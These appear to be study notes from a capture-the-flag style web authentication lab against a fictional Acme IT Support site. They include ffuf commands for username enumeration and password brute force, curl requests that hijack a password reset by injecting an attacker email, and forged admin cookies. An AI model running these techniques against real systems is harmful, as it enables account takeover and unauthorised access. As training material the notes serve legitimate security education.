## Username Enumeration

### Creating Username Lists
1. Utilize website error messages
    - Monitor responses like "Account already exists"
    - Example: Testing "admin" username on Acme IT Support

### Username Enumeration with FFUF
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
      -X POST \
      -d "username=FUZZ&email=x&password=x&cpassword=x" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -u http://10.10.38.129/customers/signup \
      -mr "username already exists"
```

#### Command Parameters
- `-w`: Wordlist path
- `-X`: HTTP method
- `-d`: POST data
- `-H`: Headers
- `-u`: Target URL
- `-mr`: Response match text

### Brute Force Attack

#### Attack Strategy
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
      -X POST \
      -d "username=W1&password=W2" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -u http://10.10.38.129/customers/login \
      -fc 200
```

#### Key Components
- Two wordlists: usernames (W1) and passwords (W2)
- POST request to login endpoint
- Filters out HTTP 200 responses
- Form-encoded data submission

#### Best Practices
- Clean username list before use
- Verify wordlist locations
- Monitor non-200 responses

### Logic Flaw

#### What is a Logic Flaw?
A logic flaw occurs when the typical logical path of an application is bypassed, circumvented, or manipulated by a hacker. These flaws can exist in any area of a website, including authentication.

#### Logic Flaw Example
```php
if( url.substr(0,6) === '/admin') {
    // Code to check user is an admin
} else {
    // View Page
}
```
The code above checks if the URL starts with `/admin` and then verifies if the user is an admin. However, due to case sensitivity, requesting `/adMin` bypasses the admin check.

#### Logic Flaw Practical
Examining the Reset Password function of Acme IT Support:
1. Enter an email (e.g., robert@acmeitsupport.thm) to receive a password reset link.
2. Enter the associated username (e.g., robert).

##### Curl Requests
1. Initial request:
    ```bash
    curl 'http://10.10.38.129/customers/reset?email=robert%40acmeitsupport.thm' \
         -H 'Content-Type: application/x-www-form-urlencoded' \
         -d 'username=robert'
    ```
2. Exploit request:
    ```bash
    curl 'http://10.10.38.129/customers/reset?email=robert%40acmeitsupport.thm' \
         -H 'Content-Type: application/x-www-form-urlencoded' \
         -d 'username=robert&email=attacker@hacker.com'
    ```

By manipulating the email parameter in the POST data, the password reset email is sent to the attacker's email.

#### Final Step
Create an account on Acme IT Support to get an email in the format `{username}@customer.acmeitsupport.thm`. Use this email in the exploit request to receive a password reset link for Robert's account.

Exploit request with your email:
```bash
curl 'http://10.10.38.129/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

### Cookie Tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

Example cookies:
```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```
- Change `logged_in` to `true` and `admin` to `true` to gain admin access.

#### Curl Requests
1. Initial request:
    ```bash
    curl http://MACHINE_IP/cookie-test
    ```
    Response: Not Logged In

2. Logged in as user:
    ```bash
    curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
    ```
    Response: Logged In As A User

3. Logged in as admin:
    ```bash
    curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
    ```
    Response: Logged In As An Admin

### Hashing

Hashes are irreversible representations of original text. Examples:
- MD5: `c4ca4238a0b923820dcc509a6f75849b`
- SHA-256: `6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`
- SHA-512: `4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a`
- SHA1: `356a192b7913b04c54574d18c28d46e6395428ab`

### Encoding

Encoding converts binary data into human-readable text and is reversible. Common types:
- Base32
- Base64

Example:
```
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```
Decoded value: `{"id":1,"admin": false}`
Encoded with admin access: `{"id":1,"admin": true}`